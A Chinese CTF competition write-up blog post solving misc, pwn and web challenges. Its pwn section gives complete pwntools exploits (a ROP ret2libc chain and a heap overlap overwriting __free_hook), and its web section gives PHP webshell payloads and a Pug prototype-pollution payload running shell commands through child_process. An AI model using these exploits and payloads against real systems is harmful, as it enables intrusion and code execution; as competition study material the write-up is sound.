---
title: 强网青少初赛WP
description: 
date: 2024-11-27
image: 
math: 
license: 
hidden: false
comments: true
draft: false
categories:
  - CTF
tags:
  - CTF
  - Misc
  - WP
---
## Misc
### 签到漫画

二维码拼图，扫码得到URL

[http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}](http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward})

### whitepic

后缀改为.gif 放入gif逐帧分析可得flag

### 删除后门用户2

题目内容：

本题需要选手完成风险排查：清理后门用户。当彻底清理好后，等待一分钟左右，/checklog会出现flag。

（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）

直接userdel显示进程占用

ps -ef查看

kill 22

kill 57 58 61

userdel -f backdoor

过一分钟拿flag

## PWN
### clock_in

题目内容：

1.We wish you success and hope you enjoy this task.

2.The flag position is in /home/ctf/flag

```python
from pwn import *

pop_rdi_ret = 0x4011C5
call_puts_pop_ret = 0x4011FA
get_info_func = 0x401202
puts_got = 0x403FD8
binsh = 0x1cb42f
system = 0x58740

io = remote('IP', 'PORT')
# io = process('./clock_in')
context.log_level = 'debug'

payload = b'a'*(64 + 8)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(call_puts_pop_ret) #call puts in get_info_func
payload += p64(0)
payload += p64(get_info_func)


io.recvuntil(b'Your info: ')
io.sendline(payload)
io.recvuntil(b'Thank you! You entered:\n')
io.recvuntil(b'\n')
libc_puts_addr = u64(io.recv(6)+b'\0'*2)
libc_base_addr = libc_puts_addr-0x87BD0
success(f'Got libc_puts_addr ====> {hex(libc_puts_addr)}')
success(f'Got libc_base_addr ====> {hex(libc_base_addr)}')

payload = b'a'*(64 + 8)
payload += p64(pop_rdi_ret)
payload += p64(binsh + libc_base_addr)
payload += p64(system + libc_base_addr)

io.recvuntil(b'Your info: \n')
io.sendline(payload)

io.interactive()
```


### journey_story

题目内容：

Record your journey, leave your story.


```python
from pwn import *

# io = process('./journey_story')
io = remote('39.106.48.123','41557')
# context(log_level='debug')

def add(size: int, con: bytes):
    io.sendlineafter(b'Choose an option: ', b'1')
    io.sendlineafter(b'): ', hex(size).encode())
    io.sendlineafter(b'characters): ', con)

def dele(index: int):
    io.sendlineafter(b'Choose an option: ', b'2')
    io.sendlineafter(b'): ', str(index).encode())

def edit(index: int, con: bytes):
    io.sendlineafter(b'Choose an option: ', b'3')
    io.sendlineafter(b'): ', str(index).encode())
    io.sendafter(b'characters): ', con)

def show():
    io.sendlineafter(b'Choose an option: ', b'4')

#unsorted bin leak libc base
for i in range(11):
    add(0x88, str(i).encode())

for i in range(7):
    dele(i)

dele(9)
edit(7, b'a'*0x88+p8(0x91))
dele(8)
add(0x90, b'a')
edit(0, b'a'*0x91)
show()
io.recvuntil(b'a'*0x90)
libc_base_addr = u64(io.recv(6)+b'\0'*2) - 0x61 + 0xe0 - (0x7f76f9e69be0 - 0x7f76f9c7d000)
free_hook_addr = libc_base_addr+ 0x1EEE48
system_addr = libc_base_addr+ 0x52290
success(f'libc_base_addr ====> {hex(libc_base_addr)}') 
success(f'free_hook_addr ====> {hex(free_hook_addr)}') 
success(f'system_addr ====> {hex(system_addr)}') 
edit(0, b'a'*0x88+p64(0x91)+p8(0xe0))

add(0x88, b'a') #1
add(0x88, b'a') #2
add(0x88, b'a') #3
add(0x88, b'a') #4

dele(1)
dele(2)
edit(4, b'a'*0x88+p8(0xb1))
dele(3)
add(0xa8, b'a') #1
edit(1, b'1'*0x88+p64(0x91)+p64(free_hook_addr))
io.sendline()
add(0x88, b'a') #2
add(0x88, p64(system_addr)) #3



# gdb.attach(io)
io.interactive()
```

interactive交互之后新建一个堆块，内容写/bin/sh回车，然后删除该堆块（本exp中堆块index应为5）

## WEB
### ezFindShell
下载附件发现好多php代码，我们找找有没有可以利用的]
`grep -r --include='*.php' 'POST' /path/to/your/directory`
找到了`1de9d9a55a824f4f8b6f37af76596baa.php`
注意`$e=$REQUEST['e'];$arr=array($POST['POST'],);array_filter($arr,base64_decode($e));`
这串代码是一句话变形马：首先使用REQUEST接收e参数传递的值,然后把`$_POST['POST']`赋值给arr数组，然后把arr数组中的每个键值传给base64_decode处理后构成的回调函数
我们只要让回调函数变成`assert`，arr数组传入的值为`system("ls /")`就好
POST提交`e=YXNzZXJ0&POST=system("ls /")`
看到flag，改下参数`e=YXNzZXJ0&POST=system("cat /flag")`
### cyberboard
上来给了个登录框,用户名和密码如下
```js
const users = [
{ id: 1, username: 'admin', password: "password_you_don't_know", role:'admin' },
{ id: 2, username: 'guest', password: 'guest123', role: 'user' }
];
```
直接登录发现存在一个留言解密,审计源码发现逻辑如下.
```js
static merge(target, source) {
	for (let key in source) {
		if (Object.prototype.hasOwnProperty.call(source, key)) {
			if (typeof source[key] === 'object' && source[key] !== null) {
				if (!target[key]) Object.assign(target, { [key]: {} });
					this.merge(target[key], source[key]);
				} else {
					target[key] = source[key]
				}
			}
		}
		return target;
	}
	save(content) {
		Message.merge(this, JSON.parse(`{"id":${Message.messages.length + 1},"content": ${content}}`));
		Message.messages.push(this);
	}
```
显然是原型链,但是不知道应该去污染谁,卡了很久.
后来在被废弃的pull请求中发现了下面的一个
https://github.com/pugjs/pug/pull/3428
遂写出payload
```
{"__proto__":{"block":{"type": "Text", "line":"console.log(process.mainModule.require('child_process').execSync('calc').toString())"}}}
```
然而又遇到一个问题,这个东西疑似不出网,反正弹shell失败,读flag写到public中得到最后的flag
```
{"__proto__":{"block":{"type": "Text", "line":"process.mainModule.require('child_process').execSync('cat /flag_1s_hereeee>./public/js/flag.txt')"}}}
```
访问`/js/flag.txt` 即可.